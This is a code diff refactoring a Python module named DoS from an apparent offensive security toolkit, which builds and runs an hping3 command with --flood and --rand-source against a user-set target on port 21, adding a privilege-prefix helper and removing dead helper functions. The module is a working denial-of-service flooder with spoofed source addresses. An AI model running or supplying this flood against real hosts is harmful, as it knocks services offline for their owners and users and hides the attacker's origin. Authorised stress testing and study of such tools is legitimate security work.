@@ -5,39 +5,13 @@
 
 import platform
 
-from utils.colors import cyan, yellow
 from utils.font_styles import error_message, info_message, success_message
-from utils.secure_utils import run_user_command, validate_hostname, validate_ip_address
-
-try:
-    from tabulate import tabulate
-except ImportError:
-
-    def tabulate(
-        tabular_data,
-        headers=(),
-        tablefmt="simple",
-        floatfmt="g",
-        intfmt="",
-        numalign="default",
-        stralign="default",
-        missingval="",
-        showindex="default",
-        disable_numparse=False,
-        colglobalalign=None,
-        colalign=None,
-        preserve_whitespace=False,
-        maxcolwidths=None,
-        headersglobalalign=None,
-        headersalign=None,
-        rowalign=None,
-        maxheadercolwidths=None,
-        break_long_words=True,
-        break_on_hyphens=True,
-    ):
-        # fallback if tabulate is not installed
-        return str(tabular_data)
-
+from utils.secure_utils import (
+    get_privilege_prefix,
+    run_user_command,
+    validate_hostname,
+    validate_ip_address,
+)
 
 from .base import BaseModule
 
@@ -104,8 +78,7 @@ class DoS(BaseModule):
         )
         print()
 
-        cmd_args = [
-            "sudo",
+        cmd_args = get_privilege_prefix() + [
             "hping3",
             "-c",
             "10000",
@@ -118,7 +91,7 @@ class DoS(BaseModule):
             "21",
             "--flood",
             "--rand-source",
-            self.target,
+            str(self.target),
         ]
 
         try:
@@ -131,70 +104,3 @@ class DoS(BaseModule):
 
         print()
         success_message(f"Finished attacking {self.target}")
-        # elif prompt_input == "run":
-        # self.execute_attack()
-
-    # elif prompt_input == "exit":
-    # exit_program()
-
-
-# elif prompt_input == "back":
-# return
-# elif prompt_input == "":
-# continue
-# elif prompt_input == "help":
-# self.show_help()
-# elif prompt_input == "clear":
-# safe_clear_screen()
-# else:
-# self.handle_invalid_command(prompt_input)
-
-
-def show_options(self):
-    """Display the module options"""
-    value = getattr(self, "target", None) or "(not set)"
-    table = [["OPTIONS", "VALUE", "OPTIONAL?"], ["TARGET", value, "no"]]
-    print(tabulate(table, headers="firstrow", tablefmt="fancy_grid"))
-
-
-def set_target(self, prompt_input):
-    """Set the target for the attack"""
-    try:
-        option = prompt_input.split()[2]
-    except IndexError:
-        error_message("No target provided to set.")
-        return
-    self.target = option
-    success_message(f'TARGET set to "{self.target}"')
-
-
-def execute_attack(self):
-    """Execute the DoS attack"""
-    target = getattr(self, "target", None)
-    if not target:
-        error_message(
-            "Cannot run DoS attack without TARGET being specified. Please specify the TARGET and try again"
-        )
-    else:
-        self.run(target)
-
-
-def show_help(self):
-    """Display help information for the module"""
-    print()
-    print(f"{cyan(f'Help for {self.name}:', ['bold', 'underlined'])}")
-    print()
-    print(
-        f"[{yellow('Optional', 'italic')}] See options that you can set using {yellow('show options', 'bold')}"
-    )
-    print(
-        f"1. Set the target using {yellow('set TARGET 123.456.789', 'bold')} or {yellow('TARGET => 123.456.789', 'bold')} (replace with target IP)"
-    )
-    print(f"2. Run your attack using {yellow('run', 'bold')}")
-    print()
-
-
-def handle_invalid_command(self, prompt_input):
-    """Handle invalid command inputs"""
-    invalid_command = prompt_input.split()[0]
-    error_message(f'Invalid command "{invalid_command}". Please enter a valid command')
